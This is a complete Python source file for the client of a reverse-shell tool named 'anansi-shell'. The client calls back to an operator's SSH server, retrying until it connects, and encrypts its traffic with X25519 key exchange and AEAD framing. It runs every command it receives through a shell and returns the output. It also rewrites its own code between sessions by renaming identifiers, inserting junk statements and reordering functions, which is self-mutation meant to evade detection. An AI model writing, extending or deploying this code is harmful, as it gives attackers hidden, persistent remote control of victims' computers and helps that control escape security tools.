"""Target, connects back to the operator over SSH."""

import argparse
import ast
import base64
import io
import os
import random
import re
import struct
import subprocess
import time
import tokenize

import paramiko
from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

# this file rewrites itself between sessions, so the operator side must never import code.
# frame mirrored from server.py
PROTO_VERSION = 1
AEAD = {1: AESGCM, 2: ChaCha20Poly1305}
MAX_FRAME = 2 << 20
CHUNK = 512 * 1024
COMMAND_TIMEOUT = 30
MUTABLE_START = "# --- MUTABLE START ---"
MUTABLE_END = "# --- MUTABLE END ---"


def seal_frame(key, algo, plaintext):
    """Encrypt into header + nonce + ciphertext"""
    nonce = os.urandom(12)
    header = bytes((PROTO_VERSION, algo))
    ciphertext = AEAD[algo](key).encrypt(nonce, base64.b64encode(plaintext), header)
    return header + nonce + ciphertext


def unseal_frame(key, body):
    """Decrypt frame body"""
    version, algo = body[0], body[1]
    if len(body) < 30 or version != PROTO_VERSION or algo not in AEAD:
        raise ValueError(f"unsupported frame header: version={version} algo={algo}")
    payload = AEAD[algo](key).decrypt(body[2:14], body[14:], body[:2])
    return base64.b64decode(payload, validate=True)


def read_exactly(channel, count):
    data = b""
    while len(data) < count:
        chunk = channel.recv(count - len(data))
        if not chunk:
            raise EOFError("channel closed mid-frame")
        data += chunk
    return data


def send_frame(channel, key, algo, plaintext):
    body = seal_frame(key, algo, plaintext)
    channel.sendall(struct.pack(">I", len(body)) + body)


def recv_frame(channel):
    (length,) = struct.unpack(">I", read_exactly(channel, 4))
    if length > MAX_FRAME:
        raise ValueError(f"frame exceeds {MAX_FRAME} bytes: {length}")
    return read_exactly(channel, length)


def send_raw(channel, blob):
    # public handshake (unencrypted)
    channel.sendall(struct.pack(">I", len(blob)) + blob)


def handshake(channel):
    """X25519 exchange to obtain session key"""
    private = X25519PrivateKey.generate()
    salt = os.urandom(16)
    send_raw(channel, private.public_key().public_bytes_raw() + salt)
    peer = X25519PublicKey.from_public_bytes(recv_frame(channel))
    return derive_key(private.exchange(peer), salt)


def derive_key(shared, salt):
    # shared secret in; session key out.
    return HKDF(hashes.SHA256(), 32, salt, b"anansi-shell v1").derive(shared)


def connect(host, port, password, fingerprint=None):
    """Open session channel for later functionality."""
    transport = paramiko.Transport((host, port))
    transport.start_client()
    server_key = transport.get_remote_server_key()
    if fingerprint and server_key.fingerprint != fingerprint:
        transport.close()
        raise SystemExit(f"host key mismatch: saw {server_key.fingerprint}")
    try:
        transport.auth_password("shell", password)
    except paramiko.AuthenticationException:
        transport.close()
        raise SystemExit("authentication failed")
    return transport, transport.open_session()


def connect_forever(host, port, password, fingerprint, verbose):
    """Retry until the operator answers."""
    while True:
        try:
            return connect(host, port, password, fingerprint)
        except (OSError, EOFError, paramiko.SSHException):
            if verbose:
                print("server unreachable, retrying", flush=True)
            # jitter.
            time.sleep(random.uniform(2.0, 5.0))


# --- MUTABLE START ---
def session(channel, verbose):
    """execute operator commands"""
    key = handshake(channel)
    # algorithm; receiver reads algo from each frame
    algo = random.choice(list(AEAD))
    while True:
        data = unseal_frame(key, recv_frame(channel))
        if data == b"ping":
            # liveness probe
            send_frame(channel, key, algo, b"pong")
            continue
        if data == b"exit":
            # operator closed the session
            return
        text = data.decode(errors="replace")
        if verbose:
            print(f"$ {text}", flush=True)
        reply = execute(text)
        # b"o" = output, b"d" = cwd, ends the reply
        # 512 KiB chunks keep every frame under MAX_FRAME
        for start in range(0, len(reply), CHUNK):
            send_frame(channel, key, algo, b"o" + reply[start:start + CHUNK])
        send_frame(channel, key, algo, b"d" + os.getcwd().encode())


def execute(command):
    """Run a command"""
    words = command.split()
    # cd must run here, not in the subprocess: a chdir would die with its shell
    if words[:1] == ["cd"]:
        return change_dir(words[1] if len(words) > 1 else "")
    try:
        done = subprocess.run(command, shell=True, capture_output=True,
                              timeout=COMMAND_TIMEOUT)
        return done.stdout + done.stderr
    except subprocess.TimeoutExpired:
        return b"command timed out\n"


def change_dir(arg):
    try:
        os.chdir(os.path.expanduser(arg or "~"))
    except OSError as exc:
        return f"cd: {exc}".encode()
    return b""
# --- MUTABLE END ---


def selfcheck():
    """Offline check for a rewritten client."""
    lines = open(__file__, encoding="utf-8").read().splitlines()
    marks = [line.strip() for line in lines if line.strip() in (MUTABLE_START, MUTABLE_END)]
    if marks != [MUTABLE_START, MUTABLE_END]:
        raise SystemExit("failed check: mutable markers")
    key = os.urandom(32)
    for algo in AEAD:
        if unseal_frame(key, seal_frame(key, algo, b"ping")) != b"ping":
            raise SystemExit("failed check: codec")
    body = bytearray(seal_frame(key, 1, b"ping"))
    body[20] ^= 1
    try:
        unseal_frame(key, bytes(body))
    except InvalidTag:
        return
    raise SystemExit("failed check: tamper undetected")


# Mutation: a name is renamable when the region defines it.
# skips names found in the region's string literals.

def split_mutable(source):
    """Split own source."""
    lines = source.splitlines(keepends=True)
    # markers stay in head/tail
    start = [i for i, line in enumerate(lines) if line.strip() == MUTABLE_START]
    end = [i for i, line in enumerate(lines) if line.strip() == MUTABLE_END]
    # start above end, or refuse
    if len(start) != 1 or len(end) != 1 or start[0] > end[0]:
        raise ValueError("mutable markers malformed")
    i, j = start[0], end[0]
    return "".join(lines[:i + 1]), "".join(lines[i + 1:j]), "".join(lines[j:])


def internal_names(region, immutable):
    """Defined in the region, not loaded outside."""
    # names inside strings or comments do not count
    defined = set()
    for node in ast.walk(ast.parse(region)):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            defined.add(node.name)
        elif isinstance(node, ast.arg):
            defined.add(node.arg)
        elif isinstance(node, ast.Name) and isinstance(node.ctx, ast.Store):
            defined.add(node.id)
        elif isinstance(node, ast.ExceptHandler) and node.name:
            defined.add(node.name)
    # names read by the immutable half: main() calls session(), locals like "key" in selfcheck()
    outside = {node.id for node in ast.walk(ast.parse(immutable))
               if isinstance(node, ast.Name) and isinstance(node.ctx, ast.Load)}
    return defined - outside


def string_literals(region):
    """Renames must not corrupt these."""
    # STRING tokens are real string literals
    blobs = []
    for token in tokenize.generate_tokens(io.StringIO(region).readline):
        if token.type in (tokenize.STRING, tokenize.FSTRING_MIDDLE):
            blobs.append(token.string)
    return " ".join(blobs)


def fresh_name(used_names):
    """New identifier"""
    while True:
        name = "".join(random.choice("bcdfgklmnprstvz") + random.choice("aeiou")
                       for _ in range(random.randint(2, 3)))
        if name not in used_names:
            used_names.add(name)
            return name


def rename_transform(source):
    """Rewrite the region with new internal names."""
    head, region, tail = split_mutable(source)
    used_names = set(re.findall(r"\b[A-Za-z_]\w*\b", source))
    mapping = {}
    for name in sorted(internal_names(region, head + tail)):
        mapping[name] = fresh_name(used_names)
    # NAME tokens only to be replaced
    lines = region.splitlines(keepends=True)
    tokens = tokenize.generate_tokens(io.StringIO(region).readline)
    edits = [t for t in tokens if t.type == tokenize.NAME and t.string in mapping]
    for token in sorted(edits, key=lambda tok: tok.start, reverse=True):
        row, col = token.start
        end = token.end[1]
        lines[row - 1] = lines[row - 1][:col] + mapping[token.string] + lines[row - 1][end:]
    return head + "".join(lines) + tail


# else, elif, except, finally statements are never visited:
# inserting a line above one of those would detach it from its statement.
BLOCK_TYPES = (ast.FunctionDef, ast.AsyncFunctionDef, ast.If, ast.For,
               ast.AsyncFor, ast.While, ast.With, ast.Try)

# Values that keep branch from ever running.
JUNK_VALUES = ("None", "False", "0", '""', 'b""')


def starts_own_line(node, lines):
    line = lines[node.lineno - 1]
    return not line[:node.col_offset].strip()


def collect_statements(statements, lines, found):
    """Statements that start their own line, block bodies includedd."""
    for node in statements:
        if not starts_own_line(node, lines):
            continue
        found.append(node)
        if isinstance(node, BLOCK_TYPES):
            collect_statements(node.body, lines, found)


def insertion_points(region):
    """A junk line may safely be inserted above."""
    lines = region.splitlines(keepends=True)
    found = []
    collect_statements(ast.parse(region).body, lines, found)
    return found


def junk_line(indent, used_names):
    """a dead assignment"""
    if random.random() < 0.5:
        value = random.choice((str(random.randint(0, 9999)),) + JUNK_VALUES)
        return f"{indent}{fresh_name(used_names)} = {value}\n"
    return f"{indent}if {random.choice(JUNK_VALUES)}: pass\n"


def junk_transform(source):
    """Insert inert statements at boundaries inside the region."""
    head, region, tail = split_mutable(source)
    used_names = set(re.findall(r"\b[A-Za-z_]\w*\b", source))
    lines = region.splitlines(keepends=True)
    points = insertion_points(region)

    count = random.randint(1, max(1, len(points) // 4))
    chosen = random.sample(points, count)

    # bottom to up: each insertion shifts every line below it,
    # so the lowest positions have to be consumed last.
    for node in sorted(chosen, key=lambda item: item.lineno, reverse=True):
        junk = junk_line(" " * node.col_offset, used_names)
        lines.insert(node.lineno - 1, junk)
    return head + "".join(lines) + tail


def order_safe(node):
    """reads no name."""
    if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
        return True
    # junk reads nothing; top-level does
    return all(isinstance(name, ast.Name) and isinstance(name.ctx, ast.Store)
               for name in ast.walk(node) if isinstance(name, ast.Name))


def reorder_transform(source):
    """Shuffle region's blocks."""
    head, region, tail = split_mutable(source)
    tree = ast.parse(region)
    defs = [node for node in tree.body
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))]
    # defs only bind names; anything else at top
    if len(defs) < 2 or not all(order_safe(node) for node in tree.body):
        return source
    lines = region.splitlines(keepends=True)
    # junk glued to its def, each def keeps the lines above it
    blocks = []
    taken = 0
    for node in defs:
        above = [line for line in lines[taken:node.lineno - 1] if line.strip()]
        blocks.append("".join(above) + "".join(lines[node.lineno - 1:node.end_lineno]))
        taken = node.end_lineno
    random.shuffle(blocks)
    return head + "\n\n".join(blocks) + "".join(lines[taken:]) + tail


def main():
    parser = argparse.ArgumentParser(description="anansi-shell client")
    parser.add_argument("--host")
    parser.add_argument("--port", type=int, default=2222)
    parser.add_argument("--password")
    parser.add_argument("--fingerprint", help="expected host key SHA256 fingerprint")
    parser.add_argument("--verbose", action="store_true")
    parser.add_argument("--selfcheck", action="store_true")
    args = parser.parse_args()
    if args.selfcheck:
        selfcheck()
        print("selfcheck ok", flush=True)
        return
    if not (args.host and args.password):
        parser.error("--host and --password are required")
    transport, channel = connect_forever(args.host, args.port, args.password,
                                         args.fingerprint, args.verbose)
    try:
        session(channel, args.verbose)
    except (OSError, EOFError):
        if args.verbose:
            print("session ended", flush=True)
    channel.close()
    transport.close()


if __name__ == "__main__":
    main()
